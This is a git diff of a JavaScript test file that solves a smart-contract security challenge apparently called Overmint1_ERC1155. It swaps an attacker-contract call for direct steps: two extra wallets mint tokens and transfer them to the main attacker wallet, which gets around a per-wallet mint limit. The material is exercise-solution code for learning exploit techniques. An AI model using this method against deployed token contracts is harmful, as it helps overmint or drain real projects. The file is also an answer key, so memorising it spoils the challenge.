@@ -23,9 +23,25 @@ describe(NAME, function () {
         })
 
         it("conduct your attack here", async function () {
-            const AttackerFactory = await ethers.getContractFactory("Overmint1_ERC1155_Attacker");
-            const attackerContract = await AttackerFactory.connect(attackerWallet).deploy(victimContract.address);
-            await attackerContract.connect(attackerWallet).attack();
+            const attackerWallet2 = (await ethers.getSigners())[2]
+            const attackerWallet3 = (await ethers.getSigners())[3]
+            // const AttackerFactory = await ethers.getContractFactory("Overmint1_ERC1155_Attacker");
+            // const attackerContract = await AttackerFactory.connect(attackerWallet).deploy(victimContract.address);
+            // await attackerContract.connect(attackerWallet).attack();
+            await victimContract.connect(attackerWallet3).mint(0, "0x00")
+            await victimContract.connect(attackerWallet3).mint(0, "0x00")
+            await victimContract.connect(attackerWallet3).mint(0, "0x00")
+            await victimContract.connect(attackerWallet2).mint(0, "0x00")
+            await victimContract.connect(attackerWallet2).mint(0, "0x00")
+
+            await victimContract.connect(attackerWallet2)
+                .safeTransferFrom(attackerWallet2.address, attackerWallet.address, 0, 2, "0x00")
+            
+            await victimContract.connect(attackerWallet3)
+                .safeTransferFrom(attackerWallet3.address, attackerWallet.address, 0, 3, "0x00")
+            
+            console.log("done")
+
         });
 
         after(async function () {
